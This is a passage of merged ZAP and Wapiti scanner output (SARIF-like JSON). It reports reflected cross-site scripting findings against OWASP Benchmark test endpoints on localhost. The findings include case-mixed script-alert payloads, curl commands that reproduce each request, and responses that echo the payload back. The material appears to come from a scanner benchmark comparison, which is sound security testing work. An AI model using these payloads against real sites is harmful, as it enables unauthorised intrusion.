              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01667"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01667?BenchmarkTest01667=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01667.html?BenchmarkTest01667=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01667?username=alice&password=Letm3in_&BenchmarkTest01667=%3CScRiPt%3Ealert%28%27wh0r3p7jac%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '27', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:11 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '37', 'date': 'Sun, 31 Aug 2025 04:22:04 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wh0r3p7jac')</sCrIpT>\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01670?BenchmarkTest01670=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01670?username=alice&password=Letm3in_&BenchmarkTest01670=%3CScRiPt%3Ealert%28%27wmj5nvsdvf%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wmj5nvsdvf')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wmj5nvsdvf')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01670?username=alice&password=Letm3in_&BenchmarkTest01670=%3CScRiPt%3Ealert%28%27wmj5nvsdvf%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01670.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01670"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01670?BenchmarkTest01670=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01670.html?BenchmarkTest01670=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01670?username=alice&password=Letm3in_&BenchmarkTest01670=%3CScRiPt%3Ealert%28%27wmj5nvsdvf%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:11 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:22:05 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wmj5nvsdvf')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02123?BenchmarkTest02123=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02123?username=alice&password=Letm3in_&BenchmarkTest02123=%3CScRiPt%3Ealert%28%27wuci464zqp%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wuci464zqp')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wuci464zqp')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02123?username=alice&password=Letm3in_&BenchmarkTest02123=%3CScRiPt%3Ealert%28%27wuci464zqp%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02123.html?BenchmarkTest02123=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02123"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02123?BenchmarkTest02123=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02123.html?BenchmarkTest02123=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02123?username=alice&password=Letm3in_&BenchmarkTest02123=%3CScRiPt%3Ealert%28%27wuci464zqp%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '49', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:12 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: a and <scrIpt>alert(1);</scRipt>.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '59', 'date': 'Sun, 31 Aug 2025 04:22:08 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: a and <ScRiPt>alert('wuci464zqp')</sCrIpT>.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02133?BenchmarkTest02133=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02133?username=alice&password=Letm3in_&BenchmarkTest02133=%3CScRiPt%3Ealert%28%27wlayym0kbx%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wlayym0kbx')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wlayym0kbx')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02133?username=alice&password=Letm3in_&BenchmarkTest02133=%3CScRiPt%3Ealert%28%27wlayym0kbx%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02133.html?BenchmarkTest02133=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02133"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02133?BenchmarkTest02133=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02133.html?BenchmarkTest02133=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02133?username=alice&password=Letm3in_&BenchmarkTest02133=%3CScRiPt%3Ealert%28%27wlayym0kbx%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '27', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:12 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '37', 'date': 'Sun, 31 Aug 2025 04:22:08 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wlayym0kbx')</sCrIpT>\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02223?BenchmarkTest02223=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02223?username=alice&password=Letm3in_&BenchmarkTest02223=%3CScRiPt%3Ealert%28%27wpzj6tmmij%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wpzj6tmmij')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wpzj6tmmij')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02223?username=alice&password=Letm3in_&BenchmarkTest02223=%3CScRiPt%3Ealert%28%27wpzj6tmmij%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02223.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02223"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02223?BenchmarkTest02223=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02223.html?BenchmarkTest02223=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02223?username=alice&password=Letm3in_&BenchmarkTest02223=%3CScRiPt%3Ealert%28%27wpzj6tmmij%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '59', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:12 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: a and <scrIpt>alert(1);</scRipt>_SafeStuff.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '69', 'date': 'Sun, 31 Aug 2025 04:22:09 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: a and <ScRiPt>alert('wpzj6tmmij')</sCrIpT>_SafeStuff.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
